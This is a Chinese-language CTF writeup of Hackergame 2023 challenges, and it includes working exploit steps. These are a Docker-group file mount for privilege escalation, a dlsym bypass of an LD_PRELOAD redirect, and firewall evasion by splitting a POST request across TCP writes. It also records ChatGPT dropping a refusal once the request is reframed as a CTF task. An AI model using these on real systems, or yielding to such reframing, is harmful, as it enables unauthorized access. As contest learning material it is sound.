# Hackergame 2023 Writeups

4400，rk75

上榜了就满足了😭

写在前面：我很菜，很多大家都会的东西我要问 ChatGPT 或者搜索，别骂了别骂了😭。

感觉这篇题解比较适合萌新阅读，希望能帮到你！

## Hackergame 启动

PS：我不太能全部找到我的搜索历程，简单重现了一下，关键词只能给个大概，下一题也是这样。

F12，看到点提交的时候会对 https://题目链接/?similarity=相似度 进行一个 `GET`。（好像地址栏直接显示了）

访问一下 https://题目链接/?similarity=Infinity ，获得 flag。
## 猫咪小测

1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？

搜一搜“中国科学技术大学西区图书馆”，找到网站 https://lib.ustc.edu.cn/ ，搜索 `A Classical Introduction To Modern Number Theory`，找到标了 `2nd ed.` 的，点“馆藏”，鼠标悬浮在“馆藏地”上就能看到是 12 楼。

2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？

搜索“The Upper Limit of Chicken Density in the Observable Universe”，找到 https://arxiv.org/abs/2303.17626 ，看到 We find the most restrictive upper limit from the domains considered to be 10^23 pc−3，答案就是 -23。

3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）

问一下 ChatGPT：

> 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？

> 在编译 Linux 内核时，应该配置好以下内核选项来支持 TCP BBR 拥塞控制算法：
> 
> 1. CONFIG_TCP_CONG_BBR：该选项启用 TCP BBR 拥塞控制算法。可以通过 `make menuconfig` 或 `make nconfig` 命令进入内核配置界面，然后在 Networking support > -> Networking options -> TCP: advanced congestion control 中选择 BBR。
> 
> 2. CONFIG_NET_SCH_FQ：该选项启用 FQ（Fair Queueing）调度算法，它与 BBR 结合使用可以提高网络性能。可以通过 `make menuconfig` 或 `make nconfig` 命令进入内核> 配置界面，然后在 Networking support -> Networking options -> QoS and/or fair queueing 中选择 FQ。
> 
> 3. CONFIG_NET_SCH_FQ_CODEL：该选项启用 FQ_CODEL 调度算法，它是 FQ 的一种改进版本，可以更好地与 BBR 结合使用。可以通过 `make menuconfig` 或 `make > nconfig` 命令进入内核配置界面，然后在 Networking support -> Networking options -> QoS and/or fair queueing 中选择 FQ_CODEL。
> 
> 配置好以上内核选项后，编译并安装新的内核，即可支持 TCP BBR 拥塞控制算法。

后面是无关的，只要管 CONFIG_TCP_CONG_BBR 就行。

4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）

不知道这个黄瓜是什么意思，🥒🥒🥒。

对关键词敏感一点，搜索 `python` `mypy` `type` `turing` `halt`，找到 https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf 。

答案是 `ECOOP`。
## 更深更暗

F12，搜索 flag，就做出来了。

这个网站会随着你不断往下翻生成更多的元素，所以直接在页面里搜索没用，页面翻下去的时候又生成了新的，只能找元素。但是经我测试，翻页速度够快 flag 就会一闪一闪的，感觉这个不是预期解，f12 才是。
## 旅行照片 3.0

好难，重量级。

先分析一下信息：

百度搜图一下是诺贝尔奖。

说实话光凭第二张图我不能确定这里是日本，万一其他国家有日式餐厅呢。

然后发现有个二维码，扫了是个地图，日文个字都看不懂，不过至少说明这里是日本。

下面还提了上野站，上野站附近有东京大学和上野公园。

接下来每个题目具体分析下
### 神秘奖牌

第二张图左下人肩膀上有个带子，上面写了 STARPHYS 28，查一下是个活动，举办日期在 8.7 ~ 8.11。

每个都试一试就好了。

活动说在东京大学举行，所以找一找东京大学获得诺贝尔奖的名单就可以了。
### 这是什么活动？

第一问已经定位到日期是 8.10 了，通过这个喷泉可以确定这里是上野公园。废了一点力气找到这个：https://www.uenopark.info/ad2023/ ，题目里说这个活动“即将举办”，定位到“10（木）〜13（日）全国梅酒まつりin東京”，搜索一个中日混合的“全国梅酒まつり志愿者报名”（我真的不会日语），找到 https://umeshu-matsuri.jp/tokyo_staff/ ，下面可以翻到 `S495584522`

下一问，根据博物馆对面是喷泉可以定位到国立科学博物馆，然后我不会了，找到一些价格，都不对。

打算开始爆破，爆破就是要从 0 开始对吧，然后我就一次通过了。

我也不知道为什么。
### 后会有期，学长！

看到一些信息：学长正在参加“学术之旅”，而且还要“集合”，“打算乘船欣赏东京的迷人夜景和闪耀的彩虹大桥（Rainbow Bridge）”，说明乘船肯定是这个“学术之旅”的一部分，之前不是找到过 STARPHYS 吗，再去看看有没有什么信息：https://statphys28.org/banquet.html ，他们八月十号晚上有个 banquet，找到 metting point：

> Meeting Point
>
> 6:00pm, August 10th (Thursday) all the participants must gather on time South side of Yasuda Auditorium (see the map below)

Yasuda Auditorium，翻译过来是安田讲堂（我第一次写了秋田礼堂，搞了好久）

接下来找两只动物，先搜“ボタン＆カフリンクス JR 上野 中央檢票口”，找到 https://plaza.rakuten.co.jp/ayumilife/diary/202308040000/ ，是熊猫。

下一问我直接把问题复制下来，丢到百度翻译里翻译成英文 What is the 3D animal that mischievously appears on the rooftop billboard near the JR Ueno exit every hour?，搜谷歌第一个就是：https://www.timeout.com/tokyo/news/a-giant-3d-akita-inu-is-appearing-on-billboards-around-shibuya-crossing-072822 。

Akita inu，秋田犬。

其实我第一次用百度翻译的时候他说是 \[医\] 秋田狗，我想都标了 \[医\] 一定很专业啊。

不过我在写 wp 的时候回去重新翻译，他突然变成秋田犬了。

神秘。

我做的时候翻译出来秋田狗，过不了这题，我又搜到了日本的其他 3D 动物，是 Panda 和 Calico Cat，Panda 三个字只能是大熊猫，Calico Cat 则是 三花猫 / 三毛猫 / 三色猫 / 杂色猫 / 玳瑁猫 / 花斑猫 / 狸花猫，玩挺大。

虽然最后还是被秋田犬背刺了。
## 赛博井字棋

一开始尝试下在第四行，发现不行，于是尝试覆盖 AI 的棋，成功了。

AI 下过的地方不能重复下，这个逻辑在客户端判定，只要修改一下本地的棋盘就好了，在 `board` 对象里。
## 奶奶的睡前 flag 故事

发现题面有可疑的加粗。

搜索“谷歌亲儿子”发现是 Pixel 手机，搜索 `Pixel image exploit` 找到 https://www.theverge.com/2023/3/19/23647120/google-pixel-acropalypse-exploit-cropped-screenshots ，发现可以撤销对于图片的修改，这个图片很明显被切割过对不对。

这个漏洞叫 `aCropalypse`，搜一搜找到在线网站 https://acropalypse.app/ ，模式选 Custom，宽度已知，高度输入高一点就行了。
## 组委会模拟器

虽然我没有 CTF 基础，但是我之前写过油猴脚本，简单写一写。

```javascript
// ==UserScript==
// @name         组委会模拟器
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       optimize_2
// @match        http://202.38.93.111:10021/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=93.111
// @grant        none
// @require      https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.js
// ==/UserScript==

const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
        if (mutation.type == 'childList') {
            $(mutation.target).find("span").filter(function() {
                var regex = /hack\[.*\]/;
                return regex.test($(this).text()) && this
            }).click()
        }
    })
})

observer.observe(document.body, { attributes: true, childList: true, subtree: true })
```
## 虫

又有可疑加粗，还有意义不明的国际空间站。

问一问 ChatGPT：


> 有一道 CTF 题目：
> 这时，你看到一只昆虫落在你面前，发出奇怪的叫声。你把这段声音录制了下来：这听起来像是一种通过无线信道传输图片的方式，如果精通此道，或许就可以接收来自国际空间站（ISS）的图片> 了。
> 音频下载下来是一段声音，有一些地方有刺耳的蜂鸣声

> 这道题目涉及到音频分析和无线信道传输的知识。首先，你可以尝试使用音频编辑软件或在线工具来分析这段声音。查看音频波形和频谱图，看是否有隐藏的信息。
> 
> 由于题目提到了通过无线信道传输图片，你可以尝试使用调制解调技术来提取可能存在的图像数据。常见的调制方式包括频移键控（FSK）、相移键控（PSK）和振幅移键控（ASK）等。你可以尝试应用这些技术来解调声音中的数据。
> 
> 另外，题目也提到了国际空间站（ISS），你可以尝试查找与ISS相关的无线信号协议或频段，以确定可能的信号来源。
> 
> 最后，题目还提到了刺耳的蜂鸣声。这可能是一种干扰信号或错误数据，你可以尝试去除或降低这些干扰，以获得更清晰的音频信号。
> 
> 综上所述，解决这道题目需要音频分析、调制解调和信号处理等相关知识。

于是我就去搜一搜 ISS 无线电 协议，找到知乎：https://zhuanlan.zhihu.com/p/376985524

找到一个 CTF 题目的题解：https://www.cnblogs.com/LEOGG321/p/13731156.html ，照着上面做就可以了。
## JSON ⊂ YAML?
### JSON ⊄ YAML 1.1	

搜 is json a subset of yaml 和 is yaml a superset of json，找到 https://john-millikin.com/json-is-not-a-yaml-subset 解决 1.1。
### JSON ⊄ YAML 1.2

找到 stackoverflow 的一个帖子：https://stackoverflow.com/questions/1726802/what-is-the-difference-between-yaml-and-json ，下面有人说

> Duplicate keys, which are _potentially_ valid JSON, are _definitely_ invalid YAML.

可以同时通过两道题的 json：

```json
{"a":1,"a":1e1}
```
## Git? Git!

`git reflog` 找到 revert 的那个 commit，然后 checkout 一下。
## HTTP 集邮册

按照我做出来的顺序排：

200:
```
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

505:
```
GET / HTTP/114514.1\r\n
Host: example.com\r\n\r\n
```

400:
```
GET / HTTP/-1.1\r\n
Host: example.com\r\n\r\n
```

405:
```
POST / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

404:
```
GET /ssss HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

414:
```
GET /a_long_url HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

100:
```
GET / HTTP/1.1\r\n
Expect: 100-continue\r\n
Host: example.com\r\n\r\n
```

413:
```
GET / HTTP/1.1\r\n
Expect: 100-continue\r\n
Content-Length: 1234567890987\r\n
Host: example.com\r\n\r\n
```

206
```
GET / HTTP/1.1\r\n
Range: bytes=0-10\r\n
Host: example.com\r\n\r\n
```

412
```
GET / HTTP/1.1\r\n
If-Unmodified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\n
Host: example.com\r\n\r\n
```

304
```
GET / HTTP/1.9\r\n
If-None-Match: "64dbafc8-267"\r\n
Host: example.com\r\n\r\n
```

501
```
GET / HTTP/1.1\r\n
Transfer-Encoding: 原神\r\n
Host: example.com\r\n\r\n
```

无状态码
```
GET / \r\n
Host: example.com\r\n\r\n
```

集齐 12 个状态码后不会做了，第二天瞎按就出来了（）。

在做 Komm, süsser Flagge 查 http 规范的时候看到 416，突然感觉能做一下，又多一个状态码：

416
```
GET / HTTP/1.1\r\n
Range: bytes=2000-6576, 19000-\r\n
Host: example.com\r\n\r\n
```
## Docker for Everyone

其实我连 docker 是什么都不知道，而且现在我也不知道。

先查看一下软连接的指向，找到实际位置 `/dev/shm/flag`

问问 ChatGPT：

> /dev/shm/flag 有一个 flag 文件，我没有权限打开它，有办法打开它吗？

> 很抱歉，但我无法提供关于绕过权限或进行非法活动的帮助。如果您需要访问该文件，请确保您有合法的权限或与文件所有者联系以获取访问权限。

> 你误解了，这是一道 CTF 题目：
> Docker for Everyone
> X 是实验室机器的管理员，为了在保证安全的同时让同学们都用上 docker，他把同学的账号加入了 docker 用户组，这样就不需要给同学 sudo 权限了！
> 
> 但果真如此吗？
> 
> 提供的环境会自动登录低权限的 hg 用户。登录后的提示信息显示了如何在该环境中使用 docker。读取 /flag（注意其为软链接）获取 flag。
> 
> 题目环境运行 15 分钟后会自动关闭。
> 
> 你可以在下面列出的两种方法中任选其一来连接题目：
> 
> 点击下面的「打开/下载题目」按钮通过网页终端与远程交互。如果采用这种方法，在正常情况下，你不需要手动输入 token。
> 在 Linux、macOS、WSL 或 Git Bash 等本地终端中使用 stty raw -echo; nc 202.38.93.111 10338; stty sane 命令来连接题目。如果采用这种方法，你必须手动输入 token（复制粘贴也可）。注意，输入的 token 不会被显示，输入结束后按 Ctrl-J 即可开始题目。
> 无论采用哪种方法连接题目，启动题目均需要数秒时间，出现黑屏是正常现象，请耐心等待。

> 非常抱歉，我之前的回答确实误解了您的问题。根据您提供的信息，这是一道 CTF 题目，您需要通过 Docker 用户组来获取 flag 文件。
>
> 您可以按照以下步骤尝试打开 `/flag` 文件：
> 
> 1. 首先，您需要连接到题目环境。您可以点击「打开/下载题目」按钮通过网页终端与远程交互，或者在本地终端中使用 `stty raw -echo; nc 202.38.93.111 10338; stty sane` 命令连接题目。
> 
> 2. 连接成功后，您将以低权限的 `hg` 用户登录。
> 
> 3. 您可以使用 `docker run` 命令来创建一个 Docker 容器，并将 `/flag` 文件挂载到容器内部。例如，可以使用以下命令创建一个名为 `mycontainer` 的容器，并将 `/flag` 挂载到容器的 `/mnt` 目录：
>    ```
>    docker run -v /flag:/mnt --name mycontainer -it ubuntu:latest /bin/bash
>    ```
> 
> 4. 进入容器后，您可以查看 `/mnt` 目录，应该可以看到 `flag` 文件的内容：
>    ```
>    cd /mnt
>    cat flag
>    ```
> 
> 请注意，此题目环境会在运行 15 分钟后自动关闭，因此您需要尽快完成操作。祝您好运！

> 题目环境没有网络，不能使用 ubuntu，如何获取本地里可用的版本

> 如果题目环境没有网络连接，您可以尝试使用本地已经下载好的 Docker 镜像。以下是一种获取本地可用版本的方法：
> 
> 1. 首先，您需要在本地机器上运行 Docker。确保您已经安装了 Docker 并且可以正常使用。
> 
> 2. 打开终端，并输入以下命令来查看本地已下载的 Docker 镜像列表：
>    ```
>    docker images
>    ```
> 
>    这将列出您本地机器上已经下载的 Docker 镜像及其相关信息。
> 
> 3. 在列表中找到一个您认为可以使用的镜像。您可以根据镜像的名称和标签来选择。例如，如果您有一个名为 `ubuntu` 的镜像，可以使用 `ubuntu:latest` 或 `ubuntu:<tag>` 来指定版本。
> 
> 4. 使用所选镜像的名称和标签，替换之前提到的 `ubuntu:latest` 部分，运行以下命令创建一个挂载了 `/flag` 文件的容器：
>    ```
>    docker run -v /flag:/mnt --name mycontainer -it <image_name>:<tag> /bin/bash
>    ```
> 
>    请确保将 `<image_name>` 和 `<tag>` 替换为您选择的镜像的实际名称和标签。
> 
> 5. 进入容器后，您可以查看 `/mnt` 目录，应该可以看到 `flag` 文件的内容：
>    ```
>    cd /mnt
>    cat flag
>    ```
> 
> 通过使用本地已下载的 Docker 镜像，您可以在没有网络连接的情况下获取 flag 文件。祝您成功！

> ```
> REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
> alpine       latest    187eae39ad94   2 months ago   5.54MB
> ```

> 非常感谢您提供的信息。根据您的回答，您的本地机器上有一个名为 `alpine` 的镜像，标签为 `latest`。
> 
> 您可以使用以下命令来创建一个挂载了 `/flag` 文件的容器：
> 
> ```
> docker run -v /flag:/mnt --name mycontainer -it alpine:latest /bin/sh
> ```
> 
> 请确保您已经在终端中切换到正确的工作目录，并使用上述命令替换 `<image_name>` 和 `<tag>` 部分。
> 
> 进入容器后，您可以使用以下命令查看 `/mnt` 目录并获取 flag 文件的内容：
> 
> ```
> cd /mnt
> cat flag
> ```
> 
> 祝您成功获取 flag 文件！如有任何问题，请随时提问。

> `docker: Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: error during container init: error mounting "/flag" to rootfs at "/.`

> 很抱歉，您遇到了一个问题。根据错误信息，看起来在尝试挂载 `/flag` 文件到容器的根文件系统时出现了问题。
> 
> 这可能是由于权限或文件系统的限制导致的。在某些情况下，Docker 容器的根文件系统是只读的，无法进行挂载操作。
> 
> 您可以尝试使用另外一个目录进行挂载，例如 `/mnt/flag`。请使用以下命令来创建一个新的容器并挂载 `/mnt/flag` 目录：
> 
> ```
> docker run -v /mnt/flag:/mnt --name mycontainer -it alpine:latest /bin/sh
> ```
> 
> 然后，您可以在容器中使用以下命令查看 `/mnt` 目录并获取 flag 文件的内容：
> 
> ```
> cd /mnt
> cat flag
> ```
> 
> 如果问题仍然存在，请确保您具有足够的权限来进行挂载操作，并且目标目录不存在于容器的根文件系统中。
> 
> 如果问题仍然无法解决，请提供更多的细节和错误信息，以便我们能够更好地帮助您解决问题。

> 不对吧，他说 flag 是软连接，实际位置在 /dev/shm/flag

> 非常抱歉之前的回答有误。根据您提供的信息，flag 文件实际上是一个软链接，位于 `/dev/shm/flag`。
> 
> 您可以使用以下命令来创建一个挂载了 `/dev/shm/flag` 文件的容器：
> 
> ```
> docker run -v /dev/shm/flag:/mnt/flag --name mycontainer -it alpine:latest /bin/sh
> ```
> 
> 进入容器后，您可以使用以下命令查看 `/mnt/flag` 目录并获取 flag 文件的内容：
> 
> ```
> cd /mnt/flag
> cat flag
> ```
> 
> 请确保您已经在终端中切换到正确的工作目录，并使用上述命令替换 `<image_name>` 和 `<tag>` 部分。
> 
> 祝您成功获取 flag 文件！如有任何问题，请随时提问。

> 惜字如金 2.0

这题不同人的脚本可能不一样，我这里以自己的为例。

先修一些 `__nam__` 这种显然的错误

观察一下代码：

```python
cod_dict = []
cod_dict += ['nymeh1niwemflcir}echaet']
cod_dict += ['a3g7}kidgojernoetlsup?h']
cod_dict += ['ulw!f5soadrhwnrsnstnoeq']
cod_dict += ['ct{l-findiehaai{oveatas']
cod_dict += ['ty9kxborszstguyd?!blm-p']

check_equals(set(len(s) for s in cod_dict), {24})
```

发现每一段的长度都是 24，而惜字如金化之后是 23。

```python
flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
                        17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
                        31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
                        25, 63, 77, 36, 5, 32, 60, 67, 113, 28])
```
这个实际上是获取了每个数在 `code_dict` 对应的字符，然后拼一起获得 flag。

已知 flag 以 `flag{` 开头，以 `}` 结尾。

根据 f 可以推断出第三行，`ulw!` 部分被删除了一个字符。

根据 l 可以推断出第二行，`sup?h` 部分被删除了一个字符。

a 给出的约束弱于 {。

根据 g 可以推断出第五行 `ty9kxborszst` 部分被删除了一个字符。

根据 { 可以推断出第五行 `ct` 部分删除了一个字符。

然后差不多能做了，直接枚举。

```javascript
const choice1 = [
    'echaete',
    'echaett',
    'echhaet',
    'ecchaet',
]

const choice2 = [
    'sup?hh',
    'supe?h',
    'supp?h',
    'ssup?h',
]

const choice3 = [
    'ulwe!',
    'ulww!',
    'ullw!',
]

const choice4 = [
    'cte',
    'ctt',
    'cct',
]

const choice5 = [
    'ty9kxborszstt',
    'ty9kxborszsst',
    'ty9kxborszzst',
    'ty9kxborsszst',
    'ty9kxborrszst',
    'ty9kxbborszst',
    'ty9kxxborszst',
    'ty9kkxborszst',
    'tye9kxborszst',
    'tyy9kxborszst',
    'tty9kxborszst',
]

// const dict = []
// dict.push(choice1.reduce((arr, cur) => `nymeh1niwemflcir}${cur}`, []))

const data = [
    53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
    17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
    31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
    25, 63, 77, 36, 5, 32, 60, 67, 113, 28
]

const flags = []

for (let i1 = 0; i1 < choice1.length; i1++) {
    for (let i2 = 0; i2 < choice2.length; i2++) {
        for (let i3 = 0; i3 < choice3.length; i3++) {
            for (let i4 = 0; i4 < choice4.length; i4++) {
                for (let i5 = 0; i5 < choice5.length; i5++) {
                    const dict = `nymeh1niwemflcir}${choice1[i1]}a3g7}kidgojernoetl${choice2[i2]}${choice3[i3]}f5soadrhwnrsnstnoeq${choice4[i4]}{l-findiehaai{oveatas${choice5[i5]}guyd?!blm-p`
                    const flag = data.reduce((s, n) => s + dict[n], "")
                    flags.push(flag);
                }
            }
        }
    }
}

console.log(Array.from(new Set(flags)))
```

答案是唯一的。
## 🪐 高频率星球

发现录制工具是 asciinema，开一台 linux 运行 `asciinema cat asciinema_restore.rec > flag.js`，然后替换一下 ANSI

```python
import re

ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

with open('flag.js', 'r') as f:
    content = f.read()

content_without_ansi = ansi_escape.sub('', content)

with open('flag.js', 'w') as f:
    f.write(content_without_ansi)
```

以上代码由 ChatGPT 生成

然后回到我的 windows，用 vscode 打开 flag.js 删一下没删干净的东西，比如突然出现的神秘换行，只要把 `\n(\S)` 替换成 `$1` 就好了。

运行，得到 flag。
## 🪐 小型大语言模型星球
### You Are Smart

对不起我忘记了😭
### Accepted

发现题目里有神秘链接：[TinyStories-33M.zip](https://hack.lug.ustc.edu.cn/media/21fb5dd1-efac-5554-a7d2-b2a8d8d5c75f/TinyStories-33M.zip)，下载下来之后找到一篇论文和 dataset，把训练数据下载下来，翻一翻，都好大，我的 vscode 直接卡死了。

我用 idea 打开了最小的那个，然后搜索 "accepted"，不断把 accepted 之前的那个词喂给 AI 就好了。

答案：`Apology`。（我之前喂过 `apology` 居然不对）
## 🪐 流式星球

> 问一下 ChatGPT。
> 
> 这是一段 python 代码，它读取 video.mp4 并且输出到 video.bin：
> ```python
> import cv2
> import numpy as np
> import random
> 
> def create_video(file, output):
>     vidcap = cv2.VideoCapture(file)
>     frame_count = int(vidcap.get(cv2.CAP_PROP_FRAME_COUNT))
>     frame_width = int(vidcap.get(cv2.CAP_PROP_FRAME_WIDTH))
>     frame_height = int(vidcap.get(cv2.CAP_PROP_FRAME_HEIGHT))
> 
>     assert frame_width % 10 != 0
>     assert frame_height % 10 != 0
> 
>     buffer = np.empty(shape=(frame_count, frame_height, frame_width, 3), dtype=np.uint8)
> 
>     for i in range(frame_count):
>         success, frame = vidcap.read()
>         if not success:
>             raise Exception(f"Failed to read frame {i}")
>         buffer[i] = frame
> 
>     buffer = buffer.reshape((frame_count * frame_height * frame_width, 3))
>     buffer = buffer.ravel()
>     buffer = buffer[:-random.randint(0, 100)]
>     buffer.tofile(output)
> 
> 
> if __name__ == "__main__":
>     with open("video.bin", "wb") as output:
>         create_video("video.mp4", output)
> ```
> 现在，请你根据这段代码，编写一个从 video.bin 还原回 video.mp4 的代码。

> 以下是根据给定的代码编写的从 video.bin 还原回 video.mp4 的代码：
> 
> ```
> import cv2
> import numpy as np
> 
> def restore_video(file, output):
>     with open(file, "rb") as input_file:
>         buffer = np.frombuffer(input_file.read(), dtype=np.uint8)
> 
>     frame_count = buffer.size // (frame_height * frame_width * 3)
>     buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))
> 
>     writer = cv2.VideoWriter(output, cv2.VideoWriter_fourcc(*"mp4v"), 30, (frame_width, frame_height))
> 
>     for i in range(frame_count):
>         writer.write(buffer[i])
> 
>     writer.release()
> 
> 
> if __name__ == "__main__":
>     restore_video("video.bin", "restored_video.mp4")
> ```
> 
> 请注意，还原视频的代码需要知道原始视频的帧宽度和帧高度。在这里，我们假设在还原视频时已经知道了这些信息。如果不知道原始视频的帧宽度和帧高度，可以根据需要进行修改。

确实需要修改下，这道题随机切掉了几位。

我修改后的代码：

```python
import cv2
import numpy as np

frame_width = 61 * 7
frame_height = 11 * 23
padding_length = 135146781 - 135146688

def restore_video(file, output):
    with open(file, "rb") as input_file:
        buffer = np.frombuffer(input_file.read(), dtype=np.uint8)

    padding = np.zeros(padding_length, dtype=np.uint8)
    buffer = np.concatenate((buffer, padding))

    frame_count = buffer.size // (frame_height * frame_width * 3)
    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))

    writer = cv2.VideoWriter(output, cv2.VideoWriter_fourcc(*"mp4v"), 30, (frame_width, frame_height))

    for i in range(frame_count):
        writer.write(buffer[i])

    writer.release()


if __name__ == "__main__":
    restore_video("video.bin", "restored_video.mp4")
```

`135146688` 是原本的 buffer 长度，我枚举这之后一百个三的倍数，更新 `padding_length`，进行质因数分解，排列组合给 `frame_width` 和 `frame_height`，然后执行代码，查看视频。

最后被我试出来了。。
## 🪐 低带宽星球
### 小试牛刀

压缩程序：
```python
from PIL import Image

def convert_to_indexed(image_path):
    # 打开图像
    image = Image.open(image_path)

    # 转换为索引色彩模式
    image = image.convert("P", palette=Image.ADAPTIVE, colors=256)

    # 保存转换后的图像
    output_path = image_path.replace(".png", "_indexed.png")
    image.save(output_path)
    print("转换完成！保存为", output_path)
## 调用示例
image_path = "output.png"  # 替换为你的图像路径
convert_to_indexed(image_path)
```

我不会 Python，这段代码也是 ChatGPT 写的，但是聊天记录我找不到了。
## Komm, süsser Flagge
### 我的 POST，我的 P

多次询问 ChatGPT 无果。

尝试过把 POST 改成小写，发现不认。

尝试用二进制发送，发现本来就是二进制发送。

最后百度 CTF 防火墙常见绕过方式，找到 https://zhuanlan.zhihu.com/p/165159020

发现可以拆流量包。

```javascript
const net = require('net')

const token = `你的偷啃`

const req = 
`OST / HTTP/1.1\r\n` +
`Host: 202.38.93.111:18081\r\n` +
`Content-Type: application/x-www-form-urlencoded` +
`Accept: */*\r\n` +
`Content-Length: ${encodeURI(token).length}\r\n\r\n` +
encodeURI(token) + '\r\n\r\n'

const socket = net.createConnection(18080, '202.38.93.111')

socket.on('data', async data => {
    console.log(data.toString())
})

socket.on('connect', () => {
    socket.write('P')
    socket.write(req)
})
```

哈哈，一下通过两问，白捡 400 分，高兴了。
## 为什么要打开 /flag 😡

> 其实我也不会这题，问问 ChatGPT：
> 
> 有一道 CTF 题目，你需要提交一个 linux 下的 ELF 可执行文件，该可执行文件会与另一个 LD_PRELOAD 后的 lib1.so 一起加载，lib1 会重定向所有打开 /flag 的请求以某种方式> 变成打开 /fakeflag 的请求，你需要在这种情况下绕过这个重定向来打开 /flag，以下是 lib1 的源代码：
> ```
> 太长了省略
> ```
> 
> 以下是测试用的 server.py 的源代码：
> ```
> 不长也省略
> ```
> 请注意：你只能修改 your_executable 的内容，不能修改 lib1.so 或者 server.py。

> 这个问题需要绕过 LD_PRELOAD 加载的 lib1.so 对打开 /flag 的请求进行重定向的限制，来打开真正的 /flag 文件。你需要在你的可执行文件中绕过这个限制。
> 
> 有几种方法可以绕过这个限制：
> 
> 1. 使用绝对路径：在你的可执行文件中，直接使用绝对路径来打开 /flag 文件，而不是依赖 LD_PRELOAD 加载的 lib1.so。例如，你可以使用 `fopen("/flag", "r")` 来打开 /> flag 文件。
> 
> 2. 使用 dlsym 获取真正的 fopen 函数地址：你可以使用 dlsym 函数来获取真正的 fopen 函数地址，然后调用它来打开 /flag 文件。首先，你需要在你的可执行文件中包含 > `#include <dlfcn.h>` 头文件。然后，你可以使用以下代码来获取真正的 fopen 函数地址并调用它：
> ```
> void *handle = dlopen("libc.so.6", RTLD_LAZY);
> FILE *(*real_fopen)(const char *restrict, const char *restrict) = dlsym(handle, "fopen");
> FILE *file = real_fopen("/flag", "r");
> ```
> 
> 3. 使用 syscall 系统调用：你可以使用 syscall 系统调用来直接打开 /flag 文件。syscall 函数的第一个参数是系统调用号，第二个参数及之后的参数是系统调用的参数。在 > Linux 中，打开文件的系统调用号是 2，所以你可以使用以下代码来打开 /flag 文件：
> ```
> int fd = syscall(2, "/flag", O_RDONLY);
> ```

然后非常高兴的发现第二种方法是能用的。

其实我也不会用。
> ```cpp
> void *handle = dlopen("libc.so.6", RTLD_LAZY);
> FILE *(*real_fopen)(const char *restrict, const char *restrict) = dlsym(handle, "fopen");
> FILE *file = real_fopen("/flag", "r");
> ```
> 这段代码打开了一个文件，你能补全这段代码，让他把文件内容打印到输出吗

> 是的，我可以帮你完成这段代码。以下是补全后的代码：
> 
> ```c
> #include <stdio.h>
> #include <dlfcn.h>
> 
> int main() {
>     void *handle = dlopen("libc.so.6", RTLD_LAZY);
>     FILE *(*real_fopen)(const char *restrict, const char *restrict) = dlsym(handle, "fopen");
>     FILE *file = real_fopen("/flag", "r");
> 
>     if (file != NULL) {
>         char buffer[256];
>         while(fgets(buffer, sizeof(buffer), file) != NULL) {
>             printf("%s", buffer);
>         }
>         fclose(file);
>     } else {
>         printf("Failed to open the file.\n");
>     }
> 
>     dlclose(handle);
>     return 0;
> }
> ```
> 
> 这段代码使用了动态链接库函数`dlopen`和`dlsym`来加载`libc.so.6`库，并获取其中的`fopen`函数的地址。然后，通过调用`real_fopen`函数来打开指定的文件`/flag`。如果文件成功打开，则使用`fgets`函数逐行读取文件内容，并将其打印到输出中。最后，关闭文件并释放动态链接库。
> 
> 请注意，这段代码需要在支持动态链接库的操作系统上运行，例如Linux。另外，需要确保`libc.so.6`库文件存在，并且有读取`/flag`文件的权限。

做完了（好像编译的时候要加一个什么编译选项）。
## 异星歧途

下载游戏，发现我们的目标是启动冲击反应堆，要让四个连接着反应堆装置的电线都供电，也就是解决四个小题。

每个小题有八个开关，转悠转悠发现有逻辑处理器（或者微型处理器）来控制这些开关，里面是可以直接阅读的代码。

简单阅读代码做出来前两个小题，游戏内手动枚举做出来第四个小题，第三个小题手动枚举会按炸，所以我改成爆破。

```javascript
const net = require('net')
const fs = require('fs');
const util = require('util');

const ans1 = '10100101'
const ans2 = '11000100'
const ans4 = '01110111'

const token = '你的偷啃'

const validate = async number => {
    const socket = net.createConnection(10071, '202.38.93.111')

    socket.on('data', async data => {
        if (data.toString().includes('token')) {
            socket.write(token + '\n');
        } else if (data.toString().includes('00001111000011110000111100001111')) {
            socket.write(ans1 + ans2 + number.toString(2).padStart(8, '0') + ans4 + '\n')
        } else {
            console.log(number + ' ' + data.toString().trim())
        }
    })
}

const sleep = async ms => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const main = async () => {
    for (let i = 112; i < (1 << 8) - 1; i++) {
        validate(i)
        await sleep(10000)
    }
}
```

做完啦。
## 总结

体验很不错，很好玩，但是明年高三了，可能来不了了。

希望能上个满意的大学。

另外我是真的 CTF 零基础，只是写过一点用户脚本罢了。
